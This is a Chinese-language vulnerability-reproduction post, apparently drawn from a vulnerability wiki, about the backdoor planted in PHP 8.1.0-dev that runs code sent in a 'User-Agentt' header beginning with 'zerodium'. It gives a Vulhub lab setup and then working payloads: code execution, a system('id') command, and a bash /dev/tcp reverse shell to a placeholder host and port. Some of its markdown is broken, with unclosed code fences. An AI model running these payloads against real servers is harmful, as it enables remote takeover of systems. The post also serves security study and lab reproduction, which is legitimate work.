---
title: "PHP 8.1.0-dev 开发版本 zerodium 后门漏洞"
date: 2026-10-22 09:18:16
categories:
  - WebSecurity
  - CVE
  - "编程语言"
  - "PHP"
tags:
  - "PHP"
  - "漏洞复现"
---
## 漏洞描述

PHP 8.1.0-dev 版本在 2021 年 3 月 28 日被植入后门，但是后门很快被发现并清除。当服务器存在该后门时，攻击者可以通过发送 User-Agentt 头来执行任意代码。

参考链接：

- https://news-web.php.net/php.internals/113838
- https://github.com/php/php-src/commit/c730aa26bd52829a49f2ad284b181b7e82a68d7d
- https://github.com/php/php-src/commit/2b0f239b211c7544ebc7a4cd2c977a5b7a11ed8a

## 漏洞影响

```
PHP 8.1.0-dev
```

## 网络测绘

```
"PHP/8.1.0-dev"
```

## 环境搭建

Vulhub 执行如下命令启动一个存在后门的 PHP 8.1 服务器：

```
docker compose up -d
```

环境启动后，服务运行在 `http://your-ip:8080`。

## 漏洞复现

添加请求头，注意是 **User-Agentt** 不是 User-Agent。

执行代码：

```
User-Agentt: zerodiumvar_dump(233*233);
<details>
<summary>POC 代码（点击展开 · 仅供学习，请勿用于非授权测试）</summary>

<pre><code class="language-text">
![](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/language/images/PHP%208.1.0-dev%20%E5%BC%80%E5%8F%91%E7%89%88%E6%9C%AC%20zerodium%20%E5%90%8E%E9%97%A8%E6%BC%8F%E6%B4%9E/image-20240529084958596.png)

执行命令：

```plain
User-Agentt: zerodium&#115;ystem("id");</code></pre>

</details>

![](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/language/images/PHP%208.1.0-dev%20%E5%BC%80%E5%8F%91%E7%89%88%E6%9C%AC%20zerodium%20%E5%90%8E%E9%97%A8%E6%BC%8F%E6%B4%9E/image-20240529085013250.png)

反弹 shell：

<details>
<summary>POC 代码（点击展开 · 仅供学习，请勿用于非授权测试）</summary>

<pre><code class="language-text">User-Agentt: zerodium&#115;ystem("bash -c 'exec &#98;ash -i &amp;&gt; &#47;dev/tcp/&lt;your-ip&gt;/&lt;port&gt; &lt;&amp; 1'");</code></pre>

</details>

![](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/language/images/PHP%208.1.0-dev%20%E5%BC%80%E5%8F%91%E7%89%88%E6%9C%AC%20zerodium%20%E5%90%8E%E9%97%A8%E6%BC%8F%E6%B4%9E/image-20240529085117047.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/language/PHP-8.1.0-dev-%E5%BC%80%E5%8F%91%E7%89%88%E6%9C%AC-zerodium-%E5%90%8E%E9%97%A8%E6%BC%8F%E6%B4%9E.md)
